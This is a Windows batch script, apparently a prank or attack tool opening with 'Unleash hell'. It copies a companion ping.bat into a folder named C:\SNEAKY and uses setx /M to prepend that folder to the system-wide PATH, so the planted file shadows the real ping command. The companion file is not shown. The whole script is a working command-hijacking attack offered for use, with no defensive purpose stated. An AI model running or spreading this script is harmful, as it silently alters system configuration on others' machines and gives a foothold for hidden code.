::Unleash hell
::Requires ping.bat to be in same folder

@echo off
setlocal enableextensions enabledelayedexpansion

mkdir C:\SNEAKY
copy "%CD%\ping.bat" C:\SNEAKY\ping.bat

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v path | findstr path >C:\SNEAKY\rawsyspath.txt
set /p syspath=<C:\SNEAKY\rawsyspath.txt
set syspath=%syspath:~29%
reg query "HKCU\Environment" /v path | findstr path >C:\SNEAKY\rawuserpath.txt
set /p userpath=<C:\SNEAKY\rawuserpath.txt
set userpath=%userpath:~29%

echo %syspath%
echo:
echo %userpath%
echo:
echo %PATH%>C:\SNEAKY\fullpathBackup.txt

set MYPATH=C:\SNEAKY;%PATH%
setx PATH "%MYPATH%" /M

echo PATH is now updated


PAUSE